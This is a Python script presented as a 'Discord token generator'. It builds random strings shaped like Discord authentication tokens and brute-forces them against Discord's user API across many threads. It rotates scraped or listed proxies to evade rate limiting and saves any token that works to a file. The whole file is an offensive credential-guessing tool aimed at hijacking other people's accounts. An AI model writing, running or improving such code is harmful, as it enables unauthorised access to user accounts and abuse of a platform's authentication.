import random
import string
import os
import time
import threading
import requests
from itertools import cycle
import ctypes
import os
import base64
from lxml.html import fromstring
import requests
import traceback
from random import randint


listproxy = []
proxyFile = open("proxy.txt", "r")
for i in proxyFile.readlines():
    i2 = i.strip("\n")
    listproxy.append(i2)

set_thread = int(input("Thread (Recommend 1000): "))
mode_proxy = int(input("Select Proxy Mode [1 = Auto, 2 = File (proxy.txt)]: "))

t_thread = 0
t_list = 0
t_work = 0
t_bad = 0
t_limit = 0
t_error = 0

class bcolors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

os.system('')
clear = lambda: os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW(f"TOKEN GENERATOR [LIST: {t_list} WORK: {t_work} BAD: {t_bad} LIMIT: {t_limit} ERROR: {t_error}]")
clear()

url = "https://discordapp.com/api/v6/users/@me/library"

def get_proxies():
    url = 'https://sslproxies.org/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies

def genToken(proxy):
    global count
    global t_list
    global t_bad
    global t_work
    global t_limit
    global t_error
    global t_thread
    t_thread +=1
    tokens = []
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(randint(000000000000000000, 999999999999999999))
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        tokens.append(token)

    for token in tokens:
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }
        try:
            #r = requests.get(url, headers=header)
            r = requests.get(url, headers=header, proxies={'https':"http://"+proxy})
            #print(r.text)
            #print(token)
            if r.status_code == 200:
                print(f"{bcolors.GREEN}[+] Token Works! - {token}{bcolors.RESET}")
                f = open("workingtokens.txt", "a")
                f.write(token+"\n")
                t_list +=1
                t_work +=1
                t_thread -=1
            elif r.status_code == 401:
                t_list +=1
                t_bad +=1
                t_thread -=1
                print(f"{bcolors.RED}[-] Invalid Token. - {token}{bcolors.RESET}")
            elif r.status_code == 429:
                t_list +=1
                t_limit +=1
                t_thread -=1
                print(f"{bcolors.YELLOW}[-] You are being rate limited. - {token}{bcolors.RESET}")
            else:
                pass

        except requests.exceptions.ProxyError:
            t_list +=1
            t_error +=1
            t_thread -=1
            print(f"{bcolors.BLUE}[-] BAD PROXY {proxy}{bcolors.RESET}")
        except:
            t_list +=1
            t_error +=1
            t_thread -=1
    tokens.remove(token)
    ctypes.windll.kernel32.SetConsoleTitleW(f"TOKEN GENERATOR [LIST: {t_list} WORK: {t_work} BAD: {t_bad} LIMIT: {t_limit} ERROR: {t_error}]")

if __name__ == "__main__":
    print("")
    print("DISCORD TOKEN GENERATOR")
    print("https://github.com/Natthanon823")
    print("")
    time.sleep(5)
    while True:
        if t_thread < set_thread:
            if mode_proxy == 2:
                proxy = random.choice(listproxy)
                threading.Thread(target=genToken, args=[proxy]).start()
            elif mode_proxy == 1:
                proxies = get_proxies()
                proxy_pool = cycle(proxies)
                proxy = next(proxy_pool)
                threading.Thread(target=genToken, args=[proxy]).start()